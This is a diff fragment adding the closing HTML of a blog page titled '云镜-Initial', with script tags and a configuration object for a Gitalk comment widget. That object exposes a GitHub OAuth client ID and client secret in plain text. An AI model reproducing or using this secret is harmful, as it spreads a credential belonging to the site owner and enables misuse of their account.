+    </div><div class="assets"><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{"gitalk":{"admin":["ML-hacker"],"clientID":"Ov23litCMvAwYlar13Vt","clientSecret":"c7a209c62df10823175338027316d019ec9593e8","id":"2025-03-18T00:02:15+08:00","owner":"ML-hacker","repo":"ML-hacker.github.io","title":"云镜-Initial"}},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/js/gitalk.min.js" defer></script></div>
+</body>
+
+</html>
